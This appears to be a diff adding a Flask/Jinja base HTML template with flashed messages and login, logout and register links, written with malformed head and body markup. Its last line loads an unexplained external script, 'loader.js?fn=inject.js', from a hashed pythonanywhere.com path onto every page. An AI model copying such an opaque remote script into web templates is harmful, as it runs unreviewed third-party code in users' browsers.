@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head
+        <link rel="stylesheet" href="https://cdn.simplecss.org/simple.min.css">
+        <body style="background-color:black;">
+        <font size="3" face="verdana" color="white">
+
+    </head>
+
+
+   <body>
+
+
+
+    {% for mesg in get_flashed_messages() %}
+      <p class="notice">{{ mesg }}</p>
+      {% endfor %}
+       <main>
+
+    {# This is how we show content only if a user is logged in #}
+    {% if current_user.is_authenticated %}
+    <h2>Hi {{current_user.username}}!</h2>
+    <a href="/logout" class="button">Logout</a>
+    {% else %}
+    <a href="/register" class="button">Register</a>
+    <a href="/login" class="button">Login</a>
+    {% endif %}
+
+
+      {% block content %} {% endblock %}
+      </main>
+   <script type='text/javascript'  src="https://www.pythonanywhere.com/4c3900f8e9dd69b5714c214642cf1a280bd60a97b72770c05502ed560d248b20/loader.js?fn=inject.js"></script></body>
+</html>
